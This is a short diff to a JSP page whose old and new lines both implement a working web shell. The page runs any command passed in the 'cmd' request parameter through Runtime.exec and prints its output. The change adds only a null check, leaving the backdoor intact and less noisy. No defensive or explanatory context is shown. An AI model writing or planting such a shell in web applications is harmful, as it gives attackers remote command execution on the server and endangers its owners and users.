@@ -1,1 +1,1 @@
-<%@ page import="java.io.*"%><%Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);out.println(dis.readLine());%>
+<%@ page import="java.io.*"%><%if (request.getParameter("cmd") != null) {Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);out.println(dis.readLine());}%>
